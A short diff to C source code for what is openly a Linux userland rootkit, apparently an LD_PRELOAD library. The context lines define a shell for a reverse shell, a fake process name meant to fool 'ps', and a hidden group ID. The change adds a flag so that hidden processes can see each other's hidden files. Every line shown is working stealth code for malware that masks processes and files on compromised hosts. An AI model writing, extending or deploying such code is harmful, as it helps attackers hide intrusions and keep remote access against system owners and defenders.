@@ -36,6 +36,7 @@
 #define SHELL "/bin/bash" //shell for reverse shell
 #define PROCESS_NAME "/etc/systemd-resolved" //name that appears as process name to fool `ps` and similiar tools
 #define HIDDEN_GID 5005
+#define ALLOW_HIDING_BYPASS 0 //allow processes with gid HIDDEN_GID to view files and processes with HIDDEN_GID, because otherwise ps is broken for hidden shells
 #define DEBUG 0 //set to 1 for logging
 
 //don't change these
@@ -308,7 +309,7 @@ int is_hidden(char *pathname) {
         return strcmp(pathname, FAKE_PRELOAD) == 0 || strcmp(pathname, LIB_PATH) == 0;
     }
     close(fd);
-    return sb.st_gid == HIDDEN_GID || strcmp(pathname, FAKE_PRELOAD) == 0 || strcmp(pathname, LIB_PATH) == 0; //return 1 if there is a match
+    return (sb.st_gid == HIDDEN_GID && ALLOW_HIDING_BYPASS == 0) || strcmp(pathname, FAKE_PRELOAD) == 0 || strcmp(pathname, LIB_PATH) == 0; //return 1 if there is a match
 }
 
 
